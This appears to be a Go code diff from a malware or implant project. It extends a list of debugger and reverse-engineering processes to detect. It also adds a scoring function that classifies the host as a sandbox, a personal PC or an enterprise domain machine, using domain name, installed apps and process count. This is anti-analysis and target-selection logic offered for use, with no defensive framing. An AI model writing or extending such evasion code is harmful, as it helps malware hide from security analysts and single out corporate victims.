@@ -351,6 +351,10 @@ func knownAnalysisProcesses() []string {
 		"ollydbg.exe",
 		"windbg.exe",
 		"ImmunityDebugger.exe",
+		"PE-bear.exe",
+		"PEiD.exe",
+		"ida.exe",
+		"stud_PE.exe",
 
 		// HTTP debugging proxies
 		"fiddler.exe",
@@ -475,4 +479,86 @@ func GetStatusOfInput() int {
 		return 0
 	}
 	return 1
+}
+
+type SystemFingerprint struct {
+	DomainName       string
+	InstalledApps    []string
+	RunningProcesses []string
+}
+
+// EvaluateEnvironmentLevel 核心判断逻辑
+// return value：0 (sandbox) | 1 (Unknown) | 2 (PC) | 3 (Domain Environment)
+func EvaluateEnvironmentLevel(fp SystemFingerprint) int {
+	score := 50 // 初始基础分
+
+	// Domain Test
+	isDomain := fp.DomainName != "" && !strings.Contains(strings.ToUpper(fp.DomainName), "WORKGROUP")
+	isTestDomain := strings.HasSuffix(strings.ToLower(fp.DomainName), ".local") || strings.Contains(strings.ToLower(fp.DomainName), "test")
+
+	if isDomain && !isTestDomain {
+		score += 40 // Enterprise domain characteristics
+	}
+
+	// 2. 软件和进程特征扫描
+	enterpriseIndicators := 0
+	personalIndicators := 0
+	sandboxIndicators := 0
+
+	enterpriseApps := []string{"dingtalk", "work wechat", "feishu", "teams", "anyconnect", "skyguard", "sangfor"}
+	personalApps := []string{"tecent", "wechat", "thunder", "baidupanduan", "chrome", "firefox", "WhatsAppRoot", "Code", "docker", "zoom", "discord"}
+	sandboxTools := []string{"wireshark", "ida pro", "x64dbg", "ghidra", "process hacker", "x32dbg.exe",
+		"x64dbg.exe",
+		"ollydbg.exe",
+		"windbg.exe",
+		"ImmunityDebugger.exe",
+		"PE-bear.exe",
+		"PEiD.exe",
+		"ida.exe",
+		"stud_PE.exe",
+	}
+
+	for _, app := range fp.InstalledApps {
+		appLower := strings.ToLower(app)
+		for _, ea := range enterpriseApps {
+			if strings.Contains(appLower, ea) {
+				enterpriseIndicators++
+			}
+		}
+		for _, pa := range personalApps {
+			if strings.Contains(appLower, pa) {
+				personalIndicators++
+			}
+		}
+		for _, st := range sandboxTools {
+			if strings.Contains(appLower, st) {
+				sandboxIndicators++
+			}
+		}
+	}
+
+	// Count processes
+	totalProcs := len(fp.RunningProcesses)
+	if totalProcs < 50 {
+		score -= 30 // Very few processes, judgment tends to favor sandbox.
+	} else if totalProcs > 120 {
+		score += 10
+	}
+
+	if sandboxIndicators > 0 {
+		score -= (sandboxIndicators * 40)
+	}
+	score += (enterpriseIndicators * 15)
+	score += (personalIndicators * 5)
+
+	switch {
+	case score < 30:
+		return 0 // Sandbox
+	case score >= 30 && score < 55:
+		return 1 // Unknown
+	case score >= 55 && score < 85:
+		return 2 // PC
+	default:
+		return 3 // Domain Environment
+	}
 }
